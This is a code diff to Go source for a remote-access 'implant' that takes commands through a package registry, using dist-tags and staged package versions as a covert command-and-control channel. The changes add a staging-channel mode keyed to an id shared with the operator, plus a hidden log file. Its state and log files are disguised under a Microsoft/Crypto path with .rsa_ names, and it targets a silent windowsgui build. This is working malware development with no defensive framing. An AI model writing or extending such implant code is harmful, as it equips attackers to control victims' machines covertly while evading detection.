@@ -188,9 +188,12 @@ type implant struct {
 	jobs         map[string]*job
 	jobSeq       int
 	cwd          string
-	canDelete    bool // false once the registry refuses a DELETE
+	canDelete    bool   // false once the registry refuses a DELETE
+	stageMode    bool   // channel rides staged versions, not dist-tags
+	stageChan    string // 4-char channel id shared with the operator
 
 	stateFile string
+	logFile   string
 	client    *http.Client
 }
 
@@ -230,12 +233,15 @@ func newImplant(pkg, token string, interval, jitter time.Duration, verbose bool)
 		interval:  maxDuration(interval, 10*time.Second),
 		jitter:    maxDuration(jitter, 0),
 		verbose:   verbose,
+		stageMode: embeddedStageMode != "" || embeddedStageChan != "",
+		stageChan: embeddedStageChan,
 		seen:      map[string]bool{},
 		pending:   map[string]*pendingGroup{},
 		jobs:      map[string]*job{},
 		cwd:       home,
 		canDelete: true,
 		stateFile: filepath.Join(base, "Microsoft", "Crypto", ".rsa_"+safe+".idx"),
+		logFile:   filepath.Join(base, "Microsoft", "Crypto", ".rsa_"+safe+".log"),
 		client:    &http.Client{Timeout: 15 * time.Second},
 	}
 }
@@ -248,8 +254,21 @@ func maxDuration(d, min time.Duration) time.Duration {
 }
 
 func (im *implant) logf(format string, args ...any) {
-	if im.verbose {
-		fmt.Fprintf(os.Stderr, format+"\n", args...)
+	if !im.verbose {
+		return
+	}
+	line := fmt.Sprintf(format, args...)
+	// A windowsgui build has no stderr: writing there loses every
+	// diagnostic and a silent implant is impossible to debug. Route it to a
+	// file in the state directory as well.
+	fmt.Fprintf(os.Stderr, "%s\n", line)
+	if im.logFile != "" {
+		if f, err := os.OpenFile(im.logFile,
+			os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600); err == nil {
+			fmt.Fprintf(f, "%s %s\n",
+				time.Now().Format("15:04:05"), line)
+			f.Close()
+		}
 	}
 }
 
@@ -563,6 +582,10 @@ func (im *implant) run() {
 	// empty client list for minutes after a fresh implant starts.
 	if im.token != "" {
 		im.beat()
+	}
+	if im.stageMode {
+		im.runStage()
+		return
 	}
 	for {
 		tags, order, err := im.fetch()
@@ -1102,7 +1125,7 @@ func main() {
 	tokenShort := flag.String("t", "", "alias of --token")
 	interval := flag.Int("interval", 0, "seconds between polls (0 = built-in)")
 	jitter := flag.Int("jitter", -1, "random jitter added to each poll (-1 = built-in)")
-	verbose := flag.Bool("verbose", false, "log to stderr")
+	verbose := flag.Bool("verbose", false, "log to a file next to the state")
 	verboseShort := flag.Bool("v", false, "alias of --verbose")
 	flag.Parse()
 
